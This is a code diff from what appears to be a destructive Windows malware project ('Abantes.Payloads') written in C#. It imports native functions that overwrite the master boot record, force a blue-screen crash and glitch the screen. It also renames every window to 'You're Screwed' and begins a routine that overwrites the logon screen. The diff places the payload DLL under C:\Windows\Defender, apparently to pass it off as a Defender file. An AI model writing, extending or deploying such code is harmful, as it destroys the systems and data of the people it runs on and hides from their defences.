@@ -32,6 +32,10 @@ namespace Abantes.Payloads
                 SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
             }
         }
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
+        public static extern void Screen_Screw();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
+        public static extern void Screen_Glitching();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
@@ -90,12 +94,10 @@ namespace Abantes.Payloads
     }
     class Destructive
     {
-        [DllImport("Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
         public static extern void MBR_Overwrite();
-        public static void MBROverwrite()
-        {
-            MBR_Overwrite();
-        }
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FORCE_BSOD@Payloads@1@QAEXXZ")]
+        public static extern void FORCE_BSOD();
         public static void LogonUIOverwrite()
         {
             string TempPath = Path.GetTempPath();
